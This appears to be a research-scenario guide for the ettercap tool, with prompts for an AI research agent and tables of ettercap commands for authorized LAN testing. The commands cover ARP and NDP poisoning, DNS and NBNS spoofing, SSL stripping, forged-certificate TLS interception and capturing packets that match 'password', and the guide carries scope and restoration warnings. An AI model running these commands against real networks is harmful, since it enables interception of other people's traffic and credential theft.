# ettercap — command scenarios for deep research

Installed build: ettercap 0.8.3.1 from Debian `ettercap-text-only`
`1:0.8.3.1-14` (shared code `ettercap-common` same version). Every flag below
appears in [`help.txt`](help.txt) or `man ettercap`; every plugin appears in
[`help-plugins.txt`](help-plugins.txt). The GTK UI is **not** installed.

> **Scope:** ARP/NDP poisoning, port stealing, DHCP spoofing, and plugin
> attacks redirect or break other hosts' traffic. Run them only on networks
> you are authorized to test, and record how you will restore forwarding and
> neighbour caches before you start.

## How to invoke

```text
@deep-research For an authorized switched-LAN assessment, compare ettercap
0.8.3.1 with bettercap 2.33.0 and the dsniff tools for ARP poisoning. How does
each tool forward intercepted traffic, restore ARP caches, and behave when the
gateway has dynamic ARP inspection? What is the difference between ettercap's
unified and bridged sniffing models, and when does `-o` require kernel
forwarding? Cite the ettercap manual, the bettercap module documentation,
RFC 826, and vendor DAI documentation; return a decision matrix with
confidence notes.
```

Create an evidence workspace and record the starting network state:

```bash
mkdir -p ~/ettercap-demo/evidence
date -u +'%Y-%m-%dT%H:%M:%SZ' > ~/ettercap-demo/evidence/run-start.txt
ip -brief link > ~/ettercap-demo/evidence/links.txt
ip neigh > ~/ettercap-demo/evidence/neigh-before.txt
sysctl net.ipv4.ip_forward > ~/ettercap-demo/evidence/forwarding-before.txt
```

## Scenario 1 — build, UI, interfaces, plugins

The installed package is text-only, and the UI choice determines what the rest
of the flags mean. Confirm both before attacking.

| # | Command | How to use |
|---|---------|------------|
| 1 | `ettercap -v` | Version banner |
| 2 | `ettercap --help` | All CLI flags |
| 3 | `dpkg -S /usr/bin/ettercap` | Confirm the text-only package |
| 4 | `ettercap -I` | List interfaces as ettercap sees them |
| 5 | `ip -brief link` | Compare with the kernel view |
| 6 | `man ettercap \| col -b \| sed -n '103,145p'` | Target-specification section |
| 7 | `ettercap -P list` | Enumerate 34 plugins without a UI |
| 8 | `sudo ettercap -Tp` | Text UI, no promiscuous mode |

**Research questions**
- Which UI front ends are compiled into this build?
- Why does `-P list` work without selecting a UI, while `-P help` does not?
- How does ettercap's interface list differ from `ip link`?
- What does `-p` change about what ettercap can see?
- Which plugins are safe to enumerate before choosing a target?

**Sources:** `ettercap --help`; `man ettercap`; `dpkg -S`; Debian package
metadata for `ettercap-text-only` and `ettercap-graphical`.
**Output:** a UI/plugin inventory and the exact target-syntax reference.

## Scenario 2 — target filters and host discovery

Targets are bidirectional filters and also bound the initial scan. Get this
wrong and you either miss traffic or poison the whole subnet.

| # | Command | How to use |
|---|---------|------------|
| 9 | `sudo ettercap -T -q -z` | Skip the initial ARP scan |
| 10 | `sudo ettercap -T -q` | Run the initial ARP scan |
| 11 | `sudo ettercap -T -q -k /tmp/hosts` | Save the discovered host list |
| 12 | `sudo ettercap -T -q -j /tmp/hosts` | Reload it |
| 13 | `sudo ettercap -Tzq //80` | Any host, port 80 only |
| 14 | `sudo ettercap -Tzq /192.0.2.10/` | One host, any port |
| 15 | `sudo ettercap -Tzq -R /192.0.2.10/` | Everything except that host |

**Research questions**
- What does `-z` remove that the default scan adds?
- How do `//`, an empty target, and no target differ?
- What does `-R` invert — the target match or the packet direction?
- Which target form causes ettercap to scan the whole subnet?
- How stable is a saved host list across interface changes?

**Sources:** `man ettercap` (`TARGET SPECIFICATION`, `-z`, `-j`, `-k`, `-R`).
**Output:** a target-filter cheat sheet tied to observed host lists.

## Scenario 3 — ARP and NDP poisoning

ARP is the standard bidirectional LAN MITM. NDP is its IPv6 counterpart.
Record forwarding state before and after every run.

| # | Command | How to use |
|---|---------|------------|
| 16 | `sudo ettercap -T -M arp // //` | Poison every host (dangerous) |
| 17 | `sudo ettercap -T -M arp:remote /192.0.2.1/ /192.0.2.2-10/` | Gateway plus clients, remote sniffing |
| 18 | `sudo ettercap -T -M arp:oneway /192.0.2.50/ /192.0.2.1/` | Poison only one direction |
| 19 | `sudo ettercap -T -o -M arp /192.0.2.50/ /192.0.2.1/` | MITM only; kernel forwards |
| 20 | `sysctl net.ipv4.ip_forward` | Confirm forwarding state |
| 21 | `sudo sysctl -w net.ipv4.ip_forward=1` | Enable forwarding for `-o` |
| 22 | `sudo ettercap -T -6 -M ndp /fe80::1/ /2001:db8::2/` | IPv6 NDP poisoning |
| 23 | `sudo ettercap -T -M arp -P chk_poison // //` | Verify poisoning succeeded |
| 24 | `sudo ettercap -T -M arp -P repoison_arp // //` | Re-poison after broadcast ARP |

**Research questions**
- When is `remote` required, and what breaks without it?
- What does `oneway` trade away in visibility?
- Why does `-o` need kernel forwarding while normal mode does not?
- What does `chk_poison` actually test, and what can it miss?
- How does NDP poisoning differ from ARP poisoning at the packet level?

**Sources:** `man ettercap` (`-M arp`, `-M ndp`, `-o`); RFC 826; RFC 4861;
`chk_poison` and `repoison_arp` plugin descriptions.
**Output:** a before/after neighbour-cache record and a forwarding-state log.

## Scenario 4 — DNS, mDNS, NBNS, and plugin-driven attacks

Plugins extend the MITM from interception to impersonation. Each plugin has
its own prerequisites and side effects.

| # | Command | How to use |
|---|---------|------------|
| 25 | `sudo ettercap -T -P dns_spoof -M arp /192.0.2.50/ /192.0.2.1/` | Spoof DNS replies |
| 26 | `sudo ettercap -T -P mdns_spoof -M arp // //` | Spoof mDNS replies |
| 27 | `sudo ettercap -T -P nbns_spoof -M arp // //` | Spoof NBNS and SMB challenges |
| 28 | `sudo ettercap -T -P sslstrip -M arp /192.0.2.50/ /192.0.2.1/` | SSL stripping |
| 29 | `sudo ettercap -T -P autoadd -M arp /192.0.2.1-254/ /192.0.2.1/` | Add new victims automatically |
| 30 | `sudo ettercap -T -P gw_discover` | Find the LAN gateway |
| 31 | `sudo ettercap -T -P find_ip` | Find an unused address |
| 32 | `sudo ettercap -T -P isolate -M arp /192.0.2.50/ /192.0.2.1/` | Isolate one host |

**Research questions**
- Which plugin consumes a hosts file, and where is it configured?
- What does `dns_spoof` answer when no matching entry exists?
- How does `nbns_spoof` differ from `dns_spoof` in target and effect?
- What does `autoadd` add to the victim set, and why is that risky?
- Which of these plugins are detection aids rather than attacks?

**Sources:** `help-plugins.txt`; `man ettercap`; plugin source in the ettercap
repository; RFC 1035; RFC 6762; RFC 1001/1002.
**Output:** a plugin capability table with prerequisites and side effects.

## Scenario 5 — logging, visualization, and content filters

Ettercap can log at several levels and filter payloads with etterfilter. Know
which flag captures what before you rely on the output.

| # | Command | How to use |
|---|---------|------------|
| 33 | `sudo ettercap -T -w capture.pcap -M arp // //` | Write all packets to a pcap |
| 34 | `sudo ettercap -T -L traffic.log -M arp // //` | Log all traffic |
| 35 | `sudo ettercap -T -l info.log -M arp // //` | Log passive information only |
| 36 | `sudo ettercap -T -m messages.log -M arp // //` | Log messages only |
| 37 | `sudo ettercap -T -c -L traffic.log -M arp // //` | Gzip-compress the log |
| 38 | `sudo ettercap -T -F filter.ef -M arp // //` | Apply an etterfilter script |
| 39 | `sudo ettercap -T -e 'password' -M arp // //` | Visualize matching packets |
| 40 | `sudo ettercap -T -E -d -M arp // //` | Extended headers plus DNS names |

**Research questions**
- What is the difference between `-L`, `-l`, and `-m`?
- Does `-w` respect the target filter, or capture everything?
- How does `-e` interact with the UI and with `-q`?
- What can an etterfilter change, and what must it not change?
- Which log format is suitable for later parsing?

**Sources:** `man ettercap` (`-w`, `-L`, `-l`, `-m`, `-c`, `-F`, `-e`, `-E`);
`man etterfilter`.
**Output:** a logging matrix and one verified etterfilter example.

## Scenario 6 — TLS interception, Lua, and clean shutdown

TLS interception and Lua scripting are the most configuration-sensitive paths.
Finish by restoring forwarding and verifying caches.

| # | Command | How to use |
|---|---------|------------|
| 41 | `sudo ettercap -T --certificate fake.crt --private-key fake.key -M arp /192.0.2.50/ /192.0.2.1/` | SSL MITM with a known cert |
| 42 | `sudo ettercap -T -S -M arp // //` | Disable certificate forging |
| 43 | `sudo ettercap -T --lua-script script.lua -M arp // //` | Run a Lua script |
| 44 | `sudo ettercap -T --lua-args user=admin -M arp // //` | Pass arguments to Lua |
| 45 | `sudo ettercap -T -Q -q -M arp // //` | Hide credentials from output |
| 46 | `sudo ettercap -T -D -M arp // //` | Daemonize without a UI |
| 47 | `sudo ettercap -T -Y eth1 -M arp // //` | Add a secondary interface |
| 48 | `sudo sysctl -w net.ipv4.ip_forward=0` | Restore forwarding |

**Research questions**
- What does the client see when ettercap forges a certificate, and what does
  `-S` change?
- Which Lua API hooks are available, and where are they documented?
- What does `-Q` suppress that `-q` does not?
- What is lost when the UI is daemonized with `-D`?
- What must be restored after an engagement, and how do you prove it?

**Sources:** `man ettercap` (`--certificate`, `--private-key`, `-S`,
`--lua-script`, `--lua-args`, `-Q`, `-D`, `-Y`); ettercap Lua API
documentation; RFC 8446.
**Output:** a TLS-interception record and a signed-off restoration checklist.

## Flag coverage checklist

| Help group / flag | Scenario |
|-------------------|----------|
| `-v`, `-h` | 1 |
| `-T`, `-C`, `-D`, `-G`, `-q`, `-s` | 1, 6 |
| `-I`, `-i`, `-Y`, `-n`, `-A` | 1, 6 |
| `-M`, `-o` | 3 |
| `-b`, `-B`, `-p`, `-S`, `-u` | 1, 3, 6 |
| `-r`, `-f`, `-R`, `-t` | 2, 5 |
| `--certificate`, `--private-key` | 6 |
| `-w`, `-L`, `-l`, `-m`, `-c` | 5 |
| `-d`, `-V`, `-e`, `-E`, `-Q` | 5, 6 |
| `--lua-script`, `--lua-args` | 6 |
| `-P`, `--plugin-list` | 1, 3, 4 |
| `-F` | 5 |
| `-z`, `-6`, `-j`, `-k` | 2, 3 |
| `-W`, `-a` | discussion (Wi-Fi/config) |

Full text: [`help.txt`](help.txt). Plugins: [`help-plugins.txt`](help-plugins.txt).

## Scenario index

| Scenario | Task | Commands |
|----------|------|----------|
| 1 | Build, UI, interfaces, plugins | 8 |
| 2 | Target filters and host discovery | 7 |
| 3 | ARP and NDP poisoning | 9 |
| 4 | DNS/mDNS/NBNS and plugins | 8 |
| 5 | Logging, visualization, filters | 8 |
| 6 | TLS, Lua, clean shutdown | 8 |
| **Total** | | **48** |

## Legal and safety

Ettercap changes neighbour caches, redirects traffic, and can break
connectivity for everyone on the segment. Use it only with written
authorization and a named target set. Before starting, record
`net.ipv4.ip_forward` and the neighbour table; after stopping, restore
forwarding, verify that caches recover, and remove any plugin side effects.
Captured credentials and pcaps are sensitive engagement evidence: encrypt
them, keep only what the report needs, and delete them at close.
